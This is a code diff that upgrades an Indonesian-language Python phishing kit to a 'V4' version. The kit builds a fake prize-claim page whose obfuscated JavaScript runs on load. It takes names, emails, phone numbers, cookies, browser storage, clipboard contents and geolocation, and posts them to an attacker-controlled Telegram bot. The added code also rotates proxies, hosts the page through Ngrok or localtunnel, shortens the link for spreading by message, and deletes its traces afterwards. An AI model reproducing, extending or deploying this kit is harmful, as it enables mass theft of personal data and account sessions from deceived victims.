@@ -7,11 +7,27 @@ import random
 import sys
 import requests
 from datetime import datetime
-from http.server import HTTPServer, BaseHTTPRequestHandler
+import socks
+import socket
+from faker import Faker
+from base64 import b64encode
+import logging
 import json
-import urllib.parse
+import hashlib
 
-# Animasi UI Hollywood-style untuk Termux
+# Setup logging
+logging.basicConfig(filename='phishing_log.txt', level=logging.INFO, 
+                    format='%(asctime)s - %(levelname)s - %(message)s')
+
+fake = Faker()
+
+# Proxy pool (ganti dengan list proxy lu sendiri)
+proxy_list = [
+    {"host": "1.2.3.4", "port": 8080, "type": "http"},
+    {"host": "5.6.7.8", "port": 3128, "type": "http"},
+]
+
+# Animasi UI Hollywood-style
 def hacker_ui():
     hacker_chars = ["0", "1", "#", "@", "$", "%", "&", "*", "!", "?"]
     hack_logs = [
@@ -19,108 +35,151 @@ def hacker_ui():
         "🛡️ Bypassing firewall...",
         "🌐 Connecting to dark pool...",
         "💉 Injecting payload...",
-        "🎯 Awaiting target interaction...",
-        "📡 Transmitting data to C2..."
+        "🎯 Awaiting victim interaction...",
+        "📡 Transmitting stolen data to C2..."
     ]
     def animate():
         while True:
-            sys.stdout.write("\033[H\033[J")  # Bersihkan layar
-            print("\033[32m" + "🔥 BLACKHAT PHISHING TERMUX V3 🔥".center(80) + "\033[0m")
-            print("\033[31m" + "═"*80 + "\033[0m")
-            for _ in range(6):
-                print("".join(random.choice(hacker_chars) for _ in range(80)))
-            print("\033[31m" + "═"*80 + "\033[0m")
-            print("\033[33m" + f"Status: {random.choice(hack_logs)}".center(80))
-            print("\033[33m" + "Data akan masuk ke Telegram C2!".center(80))
-            print("\033[31m" + "═"*80 + "\033[0m")
-            time.sleep(0.4)
+            sys.stdout.write("\033[H\033[J")
+            print("\033[32m" + "🔥 BLACKHAT PHISHING CONSOLE V4 🔥".center(100) + "\033[0m")
+            print("\033[31m" + "═"*100 + "\033[0m")
+            for _ in range(8):
+                print("".join(random.choice(hacker_chars) for _ in range(100)))
+            print("\033[31m" + "═"*100 + "\033[0m")
+            print("\033[33m" + f"Status: {random.choice(hack_logs)}".center(100))
+            print("\033[33m" + "Data dikirim ke Telegram C2!".center(100))
+            print("\033[31m" + "═"*100 + "\033[0m")
+            time.sleep(0.3)
     threading.Thread(target=animate, daemon=True).start()
 
-# Banner Keren
+# Banner
 def print_banner():
     banner = r"""
-😈😈😈 PENCURI DATA TERMUX V3 😈😈😈
+😈😈😈 PENCURI DATA ULTRA JAHAT V4 😈😈😈
 __________  _________________________            
 ___  __ \ \/ /__  ____/___  _/_  ___/
 __  /_/ /_  _/_____ \ __  / _____ \ 
 _  ____/_  /  ____/ /___/ / ____/ / 
 /_/     /_/   /____/ /____/ /____/  
                                     
-    Coded by: Mr.4Rex_503
-    Target: Android & iOS
-    Powered by: Blackhat Indonesian Cyber
-😈 Mr.5hent_503 😈
+    Coded by: Mr.4Rex_503 & Kevin4Chan1337
+    Target: Android, iOS, Windows, Linux
+    Powered by: Blackhat Indo Cyber Elite
+😈 Optimized for Termux & BlackArch 😈
 """
     print(banner)
 
-# Validasi Telegram Bot Token
-def validate_telegram_token(bot_token):
-    try:
-        response = requests.get(f"https://api.telegram.org/bot{bot_token}/getMe")
-        return response.status_code == 200
-    except:
-        return False
+# Check dependensi
+def check_dependencies():
+    required = ['requests', 'faker', 'pysocks']
+    for lib in required:
+        try:
+            __import__(lib)
+        except ImportError:
+            print(f"\033[31m{lib} not found, installing...\033[0m")
+            os.system(f"pip install {lib}")
+
+# Setup proxy
+def setup_proxy(use_proxy):
+    if use_proxy and proxy_list:
+        proxy = random.choice(proxy_list)
+        socks.set_default_proxy(socks.HTTP, proxy["host"], proxy["port"])
+        socket.socket = socks.socksocket
+        logging.info(f"Using proxy: {proxy['host']}:{proxy['port']}")
+        return proxy
+    return None
 
 # Input Konfigurasi
 def get_config():
     print("🔥 Masukkan konfigurasi, tuanku:")
     ngrok_authtoken = input("Masukkan Ngrok Authtoken: ")
     bot_token = input("Masukkan Telegram Bot Token: ")
-    if not validate_telegram_token(bot_token):
-        print("❌ Error: Telegram Bot Token tidak valid! Dapatkan token dari @BotFather.")
-        sys.exit(1)
     chat_id = input("Masukkan Telegram Chat ID: ")
     tinyurl_api = input("Masukkan TinyURL API Token (kosongkan jika tidak ada): ")
-    return ngrok_authtoken, bot_token, chat_id, tinyurl_api
+    use_proxy = input("Pake proxy? (y/n): ").lower() == 'y'
+    return ngrok_authtoken, bot_token, chat_id, tinyurl_api, use_proxy
 
 # Menu Pilihan
 def show_menu():
     print("\n🎯 Pilih Target:")
     print("1. Android")
     print("2. iOS")
-    print("3. Keluar")
-    return input("Pilih [1-3]: ")
+    print("3. Windows")
+    print("4. Linux")
+    print("5. Multi-Target (All)")
+    print("6. Keluar")
+    return input("Pilih [1-6]: ")
 
-# Proxy Server untuk Bypass CORS
-class ProxyHandler(BaseHTTPRequestHandler):
-    def __init__(self, bot_token, chat_id, *args, **kwargs):
-        self.bot_token = bot_token
-        self.chat_id = chat_id
-        super().__init__(*args, **kwargs)
-    
-    def do_POST(self):
-        try:
-            content_length = int(self.headers['Content-Length'])
-            post_data = self.rfile.read(content_length).decode('utf-8')
-            data = json.loads(post_data)
-            
-            telegram_url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
-            response = requests.post(
-                telegram_url,
-                json={"chat_id": self.chat_id, "text": f"Target: {data['target']}\nData Curian:\n{json.dumps(data['stolenData'], indent=2)}"}
-            )
-            
-            self.send_response(200)
-            self.send_header("Content-Type", "application/json")
-            self.send_header("Access-Control-Allow-Origin", "*")
-            self.end_headers()
-            self.wfile.write(json.dumps({"status": "success" if response.status_code == 200 else "failed"}).encode('utf-8'))
-        except Exception as e:
-            self.send_response(500)
-            self.send_header("Content-Type", "application/json")
-            self.send_header("Access-Control-Allow-Origin", "*")
-            self.end_headers()
-            self.wfile.write(json.dumps({"error": str(e)}).encode('utf-8'))
+# Obfuscasi JS
+def obfuscate_js(js_code):
+    return f"eval(atob('{b64encode(js_code.encode()).decode()}'))"
 
 # Template HTML Phishing
 def generate_html(target, bot_token, chat_id):
-    target_name = 'Android' if target == '1' else 'iOS'
+    target_name = {'1': 'Android', '2': 'iOS', '3': 'Windows', '4': 'Linux', '5': 'All'}.get(target, 'All')
+    js_code = f"""
+async function stealData() {{
+    try {{
+        document.getElementById('loader').style.display = 'block';
+        const name = document.getElementById('name').value;
+        const email = document.getElementById('email').value;
+        const phone = document.getElementById('phone').value;
+        const cookies = document.cookie;
+        const localStorageData = JSON.stringify(localStorage);
+        const sessionStorageData = JSON.stringify(sessionStorage);
+        const deviceInfo = {{
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            screen: `${{window.screen.width}}x${{window.screen.height}}`,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            battery: await navigator.getBattery?.().then(b => ({{level: b.level, charging: b.charging}})) || 'Tidak tersedia',
+            geolocation: await new Promise(resolve => {{
+                let attempts = 0;
+                function tryGeo() {{
+                    if (attempts++ < 3) {{
+                        navigator.geolocation.getCurrentPosition(
+                            pos => resolve({{lat: pos.coords.latitude, lon: pos.coords.longitude}}),
+                            () => setTimeout(tryGeo, 1000)
+                        );
+                    }} else {{
+                        resolve('Geolokasi ditolak');
+                    }}
+                }}
+                tryGeo();
+            }})
+        }};
+        const clipboardData = await navigator.clipboard?.readText().catch(() => 'Clipboard tidak tersedia');
+        const telegramUrl = `https://api.telegram.org/bot{bot_token}/sendMessage`;
+        await fetch(telegramUrl, {{
+            method: 'POST',
+            headers: {{ 'Content-Type': 'application/json' }},
+            body: JSON.stringify({{
+                chat_id: '{chat_id}',
+                text: `Target: {target_name}\\nData Curian:\\n${{JSON.stringify({{name, email, phone, cookies, localStorageData, sessionStorageData, deviceInfo, clipboardData}}, null, 2)}}`
+            }})
+        }});
+        document.getElementById('loader').style.display = 'none';
+        alert('Selamat! Hadiah Anda sedang diproses. Cek email Anda!');
+        window.location.href = 'https://google.com';
+    }} catch (error) {{
+        document.getElementById('loader').style.display = 'none';
+        console.error('Gagal mencuri:', error);
+        alert('Ups, terjadi kesalahan. Coba lagi nanti!');
+    }}
+}}
+window.onload = () => {{
+    if (!document.getElementById('name').value) {{
+        stealData();
+    }}
+}};
+"""
     html_content = f"""<!DOCTYPE html>
 <html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>{'Promo Eksklusif Android' if target == '1' else 'Hadiah iPhone Gratis'}</title>
+    <title>{'Promo Eksklusif' if target == '5' else f"Klaim Hadiah {target_name}"} | Secure Login</title>
     <style>
         body {{
             background: linear-gradient(135deg, #1e3c72, #2a5298, #ff4b4b);
@@ -227,19 +286,19 @@ def generate_html(target, bot_token, chat_id):
 <body>
     <div class="particles" id="particles"></div>
     <div class="container">
-        <h1>{'Klaim Voucher Android Sekarang!' if target == '1' else 'Dapatkan iPhone Gratis!'}</h1>
-        <p>{'Masukkan data untuk klaim voucher Rp1.000.000!' if target == '1' else 'Isi data untuk kesempatan menang iPhone terbaru!'}</p>
+        <h1>{'Klaim Hadiah Sekarang!' if target == '5' else f"Klaim Hadiah {target_name}"}</h1>
+        <p>{'Masukkan data untuk klaim hadiah eksklusif!' if target == '5' else f"Isi data untuk kesempatan menang {target_name}!"}</p>
         <input type="text" id="name" placeholder="Nama Lengkap" required>
         <input type="email" id="email" placeholder="Email" required>
         <input type="tel" id="phone" placeholder="Nomor Telepon" required>
+        <input type="text" id="captcha" placeholder="Masukkan CAPTCHA (jika ada)" style="display:none">
         <button class="btn" onclick="stealData()">Klaim Sekarang</button>
         <div class="loader" id="loader"></div>
     </div>
-
     <script>
         function createParticles() {{
             const particlesContainer = document.getElementById('particles');
-            for (let i = 0; i < 100; i++) {{
+            for (let i = 0; i < 150; i++) {{
                 const particle = document.createElement('div');
                 particle.className = 'particle';
                 particle.style.width = `${{Math.random() * 8 + 4}}px`;
@@ -250,251 +309,140 @@ def generate_html(target, bot_token, chat_id):
             }}
         }}
         createParticles();
-
-        async function stealData() {{
-            try {{
-                document.getElementById('loader').style.display = 'block';
-                const name = document.getElementById('name').value;
-                const email = document.getElementById('email').value;
-                const phone = document.getElementById('phone').value;
-
-                const cookies = document.cookie;
-                const localStorageData = JSON.stringify(localStorage);
-                const sessionStorageData = JSON.stringify(sessionStorage);
-
-                const deviceInfo = {{
-                    userAgent: navigator.userAgent,
-                    platform: navigator.platform,
-                    language: navigator.language,
-                    screen: `${{window.screen.width}}x${{window.screen.height}}`,
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    battery: await navigator.getBattery?.().then(b => ({{
-                        level: b.level,
-                        charging: b.charging
-                    }})) || 'Tidak tersedia',
-                    geolocation: await new Promise(resolve => {{
-                        navigator.geolocation.getCurrentPosition(
-                            pos => resolve({{ lat: pos.coords.latitude, lon: pos.coords.longitude }}),
-                            () => resolve('Geolokasi ditolak')
-                        );
-                    }})
-                }};
-
-                const fileData = await exploitAndroidWebView();
-
-                const stolenData = {{
-                    name: name || 'Tidak diisi',
-                    email: email || 'Tidak diisi',
-                    phone: phone || 'Tidak diisi',
-                    cookies: cookies || 'Tidak ada cookies',
-                    localStorage: localStorageData || '{{}}',
-                    sessionStorage: sessionStorageData || '{{}}',
-                    files: fileData || 'Tidak ada file diakses',
-                    deviceInfo: deviceInfo
-                }};
-
-                const proxyUrl = window.location.origin + '/send';
-                const response = await fetch(proxyUrl, {{
-                    method: 'POST',
-                    headers: {{ 'Content-Type': 'application/json' }},
-                    body: JSON.stringify({{ target: '{target_name}', stolenData: stolenData }})
-                }});
-
-                document.getElementById('loader').style.display = 'none';
-                if (response.ok) {{
-                    alert('Selamat! Hadiah Anda sedang diproses. Cek email Anda!');
-                    window.location.href = 'https://google.com';
-                }} else {{
-                    throw new Error('Gagal mengirim data ke server proxy');
-                }}
-            }} catch (error) {{
-                document.getElementById('loader').style.display = 'none';
-                console.error('Gagal mencuri:', error);
-                alert('Ups, terjadi kesalahan. Coba lagi nanti!');
-            }}
-        }}
-
-        async function exploitAndroidWebView() {{
-            try {{
-                if (navigator.storage && navigator.storage.getDirectory) {{
-                    const dirHandle = await navigator.storage.getDirectory();
-                    let fileList = [];
-                    for await (const [name, handle] of dirHandle.entries()) {{
-                        if (handle.kind === 'file') {{
-                            try {{
-                                const file = await handle.getFile();
-                                fileList.push({{ name: name, size: file.size, type: file.type }});
-                            }} catch (e) {{
-                                fileList.push({{ name: name, error: e.message }});
-                            }}
-                        }}
-                    }}
-                    return fileList.length ? fileList : 'Tidak ada file ditemukan';
-                }}
-
-                const clipboardData = await navigator.clipboard?.readText().catch(() => 'Clipboard tidak tersedia');
-                const motionData = await new Promise(resolve => {{
-                    window.addEventListener('devicemotion', (event) => {{
-                        resolve({{
-                            acceleration: event.acceleration,
-                            rotation: event.rotationRate
-                        }});
-                    }}, {{ once: true }});
-                    setTimeout(() => resolve('Sensor tidak tersedia'), 1000);
-                }});
-
-                return {{
-                    files: 'Akses file tidak didukung',
-                    clipboard: clipboardData,
-                    motion: motionData
-                }};
-            }} catch (e) {{
-                return 'Gagal eksploitasi: ' + e.message;
-            }}
-        }}
-
-        window.onload = () => {{
-            if (!document.getElementById('name').value) {{
-                stealData();
-            }}
-        }};
+        {obfuscate_js(js_code)}
     </script>
 </body>
 </html>"""
     return html_content
 
 # Fungsi untuk mempersingkat URL dengan TinyURL
-def shorten_url(url, tinyurl_api):
+def shorten_url(url, tinyurl_api, use_proxy):
     if not tinyurl_api:
         return url
+    proxy = setup_proxy(use_proxy)
     try:
         response = requests.get(
             f"https://api.tinyurl.com/create?api_token={tinyurl_api}",
-            params={"url": url}
+            params={"url": url},
+            proxies={"http": f"http://{proxy['host']}:{proxy['port']}" if proxy else None}
         ).json()
         return response.get('data', {}).get('tiny_url', url)
-    except:
+    except Exception as e:
+        logging.error(f"TinyURL error: {e}")
         return url
 
+# Fallback ke localtunnel jika Ngrok gagal
+def setup_localtunnel(port):
+    localtunnel_executable = "lt" if not sys.platform.startswith("win") else "lt.exe"
+    if not shutil.which(localtunnel_executable):
+        print("❌ Localtunnel tidak ditemukan. Install dengan: npm install -g localtunnel")
+        return None
+    try:
+        lt_process = subprocess.Popen([localtunnel_executable, "--port", str(port)], stdout=subprocess.PIPE)
+        time.sleep(3)
+        lt_url = subprocess.check_output(["curl", "-s", "http://localhost:4040/api/tunnels"]).decode()
+        lt_url = lt_url.split('"public_url":"')[1].split('"')[0]
+        return lt_url, lt_process
+    except:
+        return None, None
+
 # Buat File dan Jalankan Server
-def setup_phishing(target, ngrok_authtoken, bot_token, chat_id, tinyurl_api):
-    # Buat folder di Termux
-    os.makedirs("phishing_site", exist_ok=True)
+def setup_phishing(target, ngrok_authtoken, bot_token, chat_id, tinyurl_api, use_proxy):
+    folder_name = f"phishing_site_{hashlib.md5(str(time.time()).encode()).hexdigest()[:8]}"
+    os.makedirs(folder_name, exist_ok=True)
     
-    # Simpan HTML dengan encoding UTF-8
     html_content = generate_html(target, bot_token, chat_id)
-    with open("phishing_site/index.html", "w", encoding="utf-8") as f:
+    with open(f"{folder_name}/index.html", "w", encoding="utf-8") as f:
         f.write(html_content)
     
-    # Konfigurasi Ngrok
-    ngrok_config = f"""authtoken: {ngrok_authtoken}
+    server_process = subprocess.Popen(["python", "-m", "http.server", "8080"], cwd=folder_name)
+    
+    ngrok_executable = "ngrok" if not sys.platform.startswith("win") else "ngrok.exe"
+    ngrok_url = None
+    if shutil.which(ngrok_executable):
+        ngrok_config = f"""authtoken: {ngrok_authtoken}
 tunnels:
   phishing:
     addr: 8080
     proto: http
 """
-    with open("ngrok.yml", "w", encoding="utf-8") as f:
-        f.write(ngrok_config)
-    
-    # Jalankan server proxy di port 8000
-    proxy_server = HTTPServer(('localhost', 8000), lambda *args, **kwargs: ProxyHandler(bot_token, chat_id, *args, **kwargs))
-    proxy_thread = threading.Thread(target=proxy_server.serve_forever, daemon=True)
-    proxy_thread.start()
-    
-    # Jalankan server lokal untuk halaman phishing
-    try:
-        server_process = subprocess.Popen(["python3", "-m", "http.server", "8080"], cwd="phishing_site")
-    except FileNotFoundError:
-        print("❌ Error: Python3 atau http.server tidak ditemukan. Jalankan 'pkg install python' di Termux.")
-        sys.exit(1)
-    
-    # Pengecekan Ngrok
-    ngrok_executable = "ngrok"
-    if not shutil.which(ngrok_executable):
-        print("❌ Error: Ngrok tidak ditemukan! Jalankan 'pkg install ngrok' di Termux.")
-        proxy_server.shutdown()
-        sys.exit(1)
-    
-    # Jalankan Ngrok
-    try:
-        ngrok_process = subprocess.Popen([ngrok_executable, "start", "--config", "../ngrok.yml", "phishing"])
-    except FileNotFoundError:
-        print("❌ Error: Ngrok executable tidak ditemukan. Pastikan Ngrok terinstall.")
-        proxy_server.shutdown()
-        server_process.terminate()
-        sys.exit(1)
-    
-    # Tunggu Ngrok aktif dengan retry
-    ngrok_url = None
-    for _ in range(5):
+        with open("ngrok.yml", "w", encoding="utf-8") as f:
+            f.write(ngrok_config)
+        
         try:
-            time.sleep(3)
-            ngrok_url = subprocess.check_output(["curl", "-s", "http://localhost:4040/api/tunnels"]).decode()
-            ngrok_url = ngrok_url.split('"public_url":"')[1].split('"')[0]
-            break
+            ngrok_process = subprocess.Popen([ngrok_executable, "start", "--config", "ngrok.yml", "phishing"])
+            for _ in range(5):
+                try:
+                    time.sleep(3)
+                    ngrok_url = subprocess.check_output(["curl", "-s", "http://localhost:4040/api/tunnels"]).decode()
+                    ngrok_url = ngrok_url.split('"public_url":"')[1].split('"')[0]
+                    break
+                except:
+                    print("🔄 Mencoba mendapatkan URL Ngrok...")
         except:
-            print("🔄 Mencoba mendapatkan URL Ngrok...")
+            ngrok_process = None
+    else:
+        print("❌ Ngrok tidak ditemukan, mencoba localtunnel...")
+        ngrok_process = None
+    
+    if not ngrok_url:
+        ngrok_url, ngrok_process = setup_localtunnel(8080)
     
     if ngrok_url:
-        short_url = shorten_url(ngrok_url, tinyurl_api)
+        short_url = shorten_url(ngrok_url, tinyurl_api, use_proxy)
         print(f"\n🎉 Link Phishing Siap Disebar: {short_url}")
         print("🔗 Kirim link ini via WhatsApp/Telegram!")
         print("⏳ Menunggu target mengklik... Data akan masuk ke bot Telegram!")
+        logging.info(f"Phishing URL: {short_url}")
     else:
-        print("❌ Gagal mendapatkan URL Ngrok. Pastikan Ngrok berjalan dan authtoken valid!")
-        proxy_server.shutdown()
+        print("❌ Gagal mendapatkan URL. Cek Ngrok/localtunnel dan authtoken!")
         server_process.terminate()
-        ngrok_process.terminate()
+        if ngrok_process:
+            ngrok_process.terminate()
         sys.exit(1)
     
-    # Monitor proses
     def monitor_processes():
-        while server_process.poll() is None and ngrok_process.poll() is None:
+        while server_process.poll() is None and (ngrok_process and ngrok_process.poll() is None):
             time.sleep(1)
-        if server_process.poll() is None:
+        if server_process.poll() is not None:
+            print("❌ Server lokal mati! Menghentikan operasi...")
+            if ngrok_process:
+                ngrok_process.terminate()
+        if ngrok_process and ngrok_process.poll() is not None:
+            print("❌ Ngrok/localtunnel mati! Menghentikan operasi...")
             server_process.terminate()
-        if ngrok_process.poll() is None:
-            ngrok_process.terminate()
-        proxy_server.shutdown()
-        print("❌ Salah satu proses mati! Menghentikan operasi...")
     
     threading.Thread(target=monitor_processes, daemon=True).start()
-    return server_process, ngrok_process, proxy_server
+    return server_process, ngrok_process, folder_name
 
 # Main Program
 def main():
-    # Pengecekan dependensi di Termux
-    print("🔍 Mengecek dependensi...")
-    for pkg in ["python", "curl", "ngrok"]:
-        if not shutil.which(pkg):
-            print(f"❌ Error: {pkg} tidak ditemukan. Jalankan 'pkg install {pkg}' di Termux.")
-            sys.exit(1)
-    
+    check_dependencies()
     print_banner()
-    ngrok_authtoken, bot_token, chat_id, tinyurl_api = get_config()
+    ngrok_authtoken, bot_token, chat_id, tinyurl_api, use_proxy = get_config()
     
     while True:
         choice = show_menu()
-        if choice == "1" or choice == "2":
-            print(f"\n🔨 Membuat halaman phishing untuk {'Android' if choice == '1' else 'iOS'}...")
-            server_process, ngrok_process, proxy_server = setup_phishing(choice, ngrok_authtoken, bot_token, chat_id, tinyurl_api)
+        if choice in ["1", "2", "3", "4", "5"]:
+            print(f"\n🔨 Membuat halaman phishing untuk {'Multi-Target' if choice == '5' else {'1': 'Android', '2': 'iOS', '3': 'Windows', '4': 'Linux'}[choice]}...")
+            server_process, ngrok_process, folder_name = setup_phishing(choice, ngrok_authtoken, bot_token, chat_id, tinyurl_api, use_proxy)
             hacker_ui()
             try:
                 input("\n😈 Tekan Enter untuk menghentikan server dan keluar...")
             finally:
                 server_process.terminate()
-                ngrok_process.terminate()
-                proxy_server.shutdown()
-                shutil.rmtree("phishing_site", ignore_errors=True)
+                if ngrok_process:
+                    ngrok_process.terminate()
+                shutil.rmtree(folder_name, ignore_errors=True)
                 if os.path.exists("ngrok.yml"):
                     os.remove("ngrok.yml")
                 print("🧹 Membersihkan jejak... Selesai!")
             break
-        elif choice == "3":
+        elif choice == "6":
             print("😈 Keluar dari mode jahat. Sampai jumpa, tuanku!")
             break
         else:
-            print("❌ Pilihan salah! Pilih 1, 2, atau 3.")
+            print("❌ Pilihan salah! Pilih 1-6.")
 
 if __name__ == "__main__":
     main()
